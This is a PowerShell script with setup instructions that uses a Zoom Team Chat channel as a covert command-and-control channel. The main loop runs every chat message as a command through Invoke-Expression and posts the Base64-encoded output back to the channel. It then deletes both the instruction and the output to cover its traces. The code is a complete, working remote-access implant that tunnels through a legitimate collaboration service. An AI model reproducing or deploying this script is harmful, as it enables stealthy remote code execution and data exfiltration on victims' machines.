<####################################################################################################

    Workflow:

    0) Create a Zoom account, install Zoom Workspace on your machine
    
    1) Go to https://marketplace.zoom.us, login with your Zoom account & create a Server to Server OAuth App

    2) Information tab, fill up:
        > Short Description
        > Company Name
        > Developer Name
        > Developer Email

    3) Scopes tab, click Add Scopes to assign permissions:
        > Generally grant all permissions under Team Chat
        > TBD: Zoom in only on specific permissions required

    4) Activations tab, publish the app

    5) Go back to App Credentials tab
        > Copy Account ID, Client ID and Client Secret
        > Paste it into the CONFIGURATION section below

    6) Launch Zoom Workplace on a PC > login with your Zoom account from Step 0
    
    7) In Zoom Workplace
        > click Team Chat 
        > click ... beside # Channels 
        > click Create a channel
        > Fill in the channel name into CONFIGURATION section below

    8) Run the script, input commands into the channel chat.

    9) To decode responses in Zoom Workplace channel, use the powershell command [Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(“”))


###########################################################################################################>


<######################################################################################################

    Script Functionality:
    
    Get-AccessToken 
    Uses Client ID, Client Secret & Account ID to request for a JWT into variable $AccessToken to authorize comms to Zoom API
    
    Get-ChannelIdFromName
    Uses $ChannelName created in Zoom Workplace to get the Channel ID into variable $ChannelId, to be used in Getting, Sending and Deleting Messages.

    Get-LatestMessage
    Uses $AccessToken and $ChannelId to get the latest message in the channel.

    Delete-Message
    Delete message to keep the chat clean to receive next instructions

    Send-Message
    Send response to chat after executing instructions
    

######################################################################################################>

# ===== CONFIGURATION =====
$AccountId   = "<See Workflow Step 5>"
$ClientId    = "<See Workflow Step 5>"
$ClientSecret= "<See Workflow Step 5>"
$ChannelName = "<See Workflow Step 7>"

# ===== FUNCTIONS =====

function Get-AccessToken 
{
    $auth = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("${ClientId}:${ClientSecret}"))

    $body = @{
        grant_type = "account_credentials"
        account_id = $AccountId
    }

    $response = Invoke-RestMethod -Method Post `
        -Uri "https://zoom.us/oauth/token" `
        -Headers @{ Authorization = "Basic $auth" } `
        -Body $body

    return $response.access_token
}

function Get-ChannelIdFromName($token, $channelName) 
{
    $url = "https://api.zoom.us/v2/chat/users/me/channels"
    
    $resp = Invoke-RestMethod -Uri $url -Headers @{ Authorization = "Bearer $token" }

    foreach ($ch in $resp.channels) 
    {
        if ($ch.name -eq $channelName) 
        {
            return $ch.id
        }
    }

    Write-Error "Channel '$channelName' not found!"
    
    exit 1
}

function Get-LatestMessage($token, $channelId) 
{
    $url = "https://api.zoom.us/v2/chat/users/me/messages?to_channel=$channelId&page_size=1"
    
    $resp = Invoke-RestMethod -Uri $url -Headers @{ Authorization = "Bearer $token" }

    if ($resp.messages.Count -gt 0) 
    {
        $msg = $resp.messages[0]
        #Write-Host "Latest message in channel: [$($msg.sender)] $($msg.message)"
        return $msg
    }
    else 
    {
        Write-Host "No instructions found in channel yet."
        Write-Host ""
        return $null
    }

}

function Delete-Message($token, $messageId, $channelId) 
{
    $url = "https://api.zoom.us/v2/chat/users/me/messages/$($messageId)?to_channel=$channelId"
    #Write-Host "Debug: Attempt to delete message via URL now: $url"
    Invoke-RestMethod -Uri $url -Method DELETE -Headers @{ Authorization = "Bearer $token" } | Out-Null
}

function Send-Message($token, $channelId, $text) 
{
    $url = "https://api.zoom.us/v2/chat/users/me/messages"
    
    $body = @{
        to_channel = $channelId
        message    = $text
    } | ConvertTo-Json
    
    Invoke-RestMethod -Method Post -Uri $url `
        -Headers @{ Authorization = "Bearer $token"; "Content-Type"="application/json" } `
        -Body $body #-ErrorAction SilentlyContinue
}

# ===== MAIN LOOP =====

# Get JWT Authorization token
$AccessToken = Get-AccessToken
Start-Sleep -Seconds 5

# Get Channel ID from Channel Name
$ChannelId   = Get-ChannelIdFromName $AccessToken $ChannelName
Start-Sleep -Seconds 5

Write-Host ""
Write-Host "Monitoring channel '$ChannelName' (ID: $ChannelId)..."
Write-Host ""

while ($true) 
{
    # Endless loop to check for latest message
    $msg = Get-LatestMessage $AccessToken $ChannelId
    Start-Sleep -Seconds 5

    #Debug: Write-Host $msg

    if ($null -ne $msg) 
    {
        $text   = $msg.message
        $msgId = $msg.id
        $sender = $msg.sender

        # If there's a message, run instructions based on the message contents
        if (![string]::IsNullOrWhiteSpace($text)) 
        {
            Write-Host "[+] New instructions: $text"
            Write-Host ""

            # Run instructions
            $command = $msg.message
            $commandOutput = Invoke-Expression $command | Out-String

            # Prepare output to be sent
            # Trim blank spaces at the end of the content > then convert to base64
            $body = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandOutput))

            Start-Sleep -Seconds 12

            # Delete message
            Write-Host "... Deleting instructions ..."
            Write-Host ""
            Delete-Message $AccessToken $msgId $ChannelId

            Start-Sleep -Seconds 12

            # Send command output
            Send-Message $Accesstoken $ChannelId $body
            Write-Host " ... Instructions output sent! ..."
            Write-Host ""
            Write-Host " !!! Copy the instructions output now. It will be auto-deleted in 20 seconds !!! "
            Write-Host ""

            Start-Sleep -Seconds 10
            
            # Get latest message ID to delete
            $msg = Get-LatestMessage $AccessToken $ChannelId
            $msgId = $msg.id

            Start-Sleep -Seconds 10

            # Delete command output
            Delete-Message $AccessToken $msgId $ChannelId
            Write-Host " ... Instructions output deleted ... "
            Write-Host ""
        }
    }

    Start-Sleep -Seconds 12
}

